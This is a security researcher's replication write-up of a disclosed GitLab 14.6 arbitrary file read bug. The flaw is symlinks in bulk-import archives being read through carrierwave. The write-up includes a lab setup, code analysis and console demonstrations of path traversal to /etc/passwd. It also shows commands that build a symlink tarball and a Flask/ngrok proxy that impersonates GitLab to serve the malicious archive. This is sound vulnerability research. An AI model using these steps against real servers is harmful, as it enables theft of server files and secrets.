---
layout: post
title: "Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline"
date: 2024-01-15 10:31:06 +0800
categories: path-traversal
---

## Name

> Gitlab Arbitrary file read via the bulk imports UploadsPipeline

## Weakness

> path-traversal

## Severity

> 高危

## Environment

```
GitLab information

Version: 14.6.0-ee
Directory: /opt/gitlab/embedded/service/gitlab-rails
```

> 原文：[https://hackerone.com/reports/1439593](https://hackerone.com/reports/1439593)

**Gitlab Docker**

```
docker run --detach \
  --hostname 10.206.44.20 \
  --publish 4435:443 --publish 8035:80 --publish 2235:22 \
  --name gitlab14.6 \
  --restart always \
  --shm-size 256m \
  gitlab/gitlab-ee:14.6.0-ee.0
```

## Summary

Group导入，从其他gitlab instance导入，被导入的group milestone中的附件会形成压缩文件，并且下载到后端。而后端在解压时，没有对压缩包的symlink进行去除，导致该链接文件指向的任意文件被读取和导入。造成任意文件读取漏洞。

### Methods flow

触发该行为的controller：
*app/controllers/import/bulk_imports_controller.rb:43*
```
def create
    responses = create_params.map { |entry| ::BulkImports::CreateService.new(current_user, entry, credentials).execute }

    render json: responses.map { |response| { success: response.success?, id: response.payload[:id], message: response.message } }
end
```

文件解压采用popen执行命令方式：
*lib/gitlab/import_export/command_line_util.rb*
```
def untar_with_options(archive:, dir:, options:)
    execute_cmd(%W(tar -#{options} #{archive} -C #{dir}))
    execute_cmd(%W(chmod -R #{UNTAR_MASK} #{dir}))
end
```

解压后对文件进行移动或者上传:
*app/services/upload_service.rb*
```
def execute
    return unless file && file.size <= max_attachment_size

    uploader = uploader_class.new(model, nil, **uploader_context)
    uploader.store!(file)

    uploader
end
```
其中store!函数是carrierwave库的内置函数，用于移动文件。

### Analysis

对carrierwave库进行demo测试，发现carrierwave的store!方法能够直接读取symlink指向的文件内容并且进行存储,对carrierwave进行文件操作测试：

1. 测试路径穿越
2. 测试symlink读取和写入

参考：[Uploading files in Rails 5](https://www.youtube.com/watch?v=4VkKmQWJoBI)

1. create app: `rails new Carrierwave`
2. add carrierwave to gemfile: `gem 'carrierwave', '~> 3.0'`
3. `bundle install`
4. create uploader:  `rails generate uploader File`
5. create scaffold: `rails generate scaffold Test image:string`
6. add `mount_uploader :image, FileUploader` to test.rb model
7. migrate db: `bin/rails db:migrate`
8. change add image view: app/view/test/_form
    a. `<%= form.file_field :image %>`
9. start server: `bin/rails s -b 0.0.0.0`
10. open: localhost:3000/tests to upload image
11. `bin/rails console` to debug:(prepare file: `ln -s /etc/passwd /home/kali/test`)
    - initialize
        ```
        u = Test.new
        u.id = 1
        b = File.open("/home/kali/test")
        u.image.store!(b)
        check file content: /home/kali/rubyprojects/Carrierwave/public/uploads/test/image/1/test
        ```
    - Uploader:: retrieve_from_store!方法：存在目录穿越问题
        ```
        u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
        u.image.file
        #<CarrierWave::SanitizedFile:0x00007f7daa7cfe50
            @content=nil,
            @content_type=nil,
            @declared_content_type=nil,
            @file="/etc/passwd",
            @original_filename=nil>
        ```
    - Uploader:: retrieve_from_store!方法配合copy_to方法：通过目录穿越读取任意文件
        ```
        u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
        u.image.file
        #<CarrierWave::SanitizedFile:0x00007f7da8c38ea8
            @content=nil,
            @content_type=nil,
            @declared_content_type=nil,
            @file="/etc/passwd",
            @original_filename=nil>
        b = File.open('/home/kali/test')
        u.image.file.copy_to(b)
        那么u.image.file指向的/etc/passwd会拷贝到文件/home/kali/test
        ```
    - CarrierWave::SanitizedFile copy_to方法：存在读取链接文件问题 
        ```
        u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/link') # link指向/etc/passwd
        u.image.file
        #<CarrierWave::SanitizedFile:0x00007f7da89fc0b8
            @content=nil,
            @content_type=nil,
            @declared_content_type=nil,
            @file="/home/kali/link",
            @original_filename=nil>
        u.image.file.copy_to(File.open('/home/kali/blank')) # 此时，blank文件被拷贝了passwd内容
        ```
    - CarrierWave::SanitizedFile store!方法：存在读取链接文件问题 
        ```
        u.image.store!(File.open("/home/kali/link")) # link指向/etc/passwd，此时，passwd内容被存储进model的内部空间
        ```
    - CarrierWave::SanitizedFile store!方法：测试写入链接文件能力，无该问题 
        ```
        u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/test2') # test2指向test
        u.image.store!(File.open("/home/kali/test3")) # 写入内容失败，原因是store!只会写入model指向的空间
        ```


## Tips

1. get all routes of rails app:
    ```
    gitlab-rails routes > routes.txt
    ```
2. create symlink and compress to tar.gz, extract tar.gz file to folder:
    ```
    ln -s /etc/passwd passwd
    
    tar –czf test.tar.gz passwd
    
    tar –xzf test.tar.gz -c /tmp/data
    ```
3. import burpsuite cert:
    ```
    apt-get install -y ca-certificates
    convert burp.der to burp.crt format
    sudo openssl x509 -inform der -outform pem -in burp.der -out burp.crt
    copy burp.crt to ca loaction:
    sudo cp burp.crt /usr/local/share/ca-certificates/
    # 参考：https://docs.gitlab.com/omnibus/settings/ssl/index.html#using-a-custom-certificate-chain，gitlab自身配置了新地方
    sudo cp burp.crt /etc/gitlab/trusted-certs/
    sudo update-ca-certificates
    gitlab-ctl reconfigure 
    ```
4. 路径穿越，并且进行拷贝
    - fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()
    - copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的任意文件拷贝到指定路径
5. 路径穿越读取链接文件，拷贝链接文件指向内容
    - fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()，也可以索引到链接文件
    - copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的链接文件指向内容拷贝到指定路径
6. 直接读取链接文件指向内容
    - store!的参数是File句柄，当该句柄指向链接文件，那么可以读取链接文件内容。配合解压后的文件包含的链接文件。
7. 文件解压操作，命令行方式以及第三方库方式
8. ngrok伪造服务器，进行流量分发：

    ```
    from flask import Flask, request, Response, send_file
    import requests

    app = Flask(__name__)
    HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT',
                    'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']

    def do_proxy(request, path):
        excluded_headers = ['content-encoding',
                            'content-length', 'transfer-encoding', 'connection', 'host']

        headers = [(name, value) for (name, value) in request.headers
                if name.lower() not in excluded_headers]

        host = request.headers["host"]
        if host.endswith("ngrok.io"):
            host = "gitlab.com"
            
        resp = requests.request(
            url=f'https://{host}/{path}?{request.query_string.decode()}', method=request.method, headers=dict(headers), data=request.data)
        
        headers = [(name, value) for (name, value) in resp.raw.headers.items()
                if name.lower() not in excluded_headers]
        response = Response(resp.content, resp.status_code, headers)
        return response

    @app.route('/', defaults={'path': ''}, methods=HTTP_METHODS)
    @app.route('/<path:path>', methods=HTTP_METHODS)
    def proxy(path):
        # 对流量进行过滤，对于含有漏洞的请求，发送payload
        if request.method == "GET" and request.query_string == b"relation=uploads":
            return send_file("uploads.tar.gz", as_attachment=True, mimetype="application/octet-stream")
        else:
            # 其他正常请求，发送到gitlab服务器处理
            return do_proxy(request, path)

    ```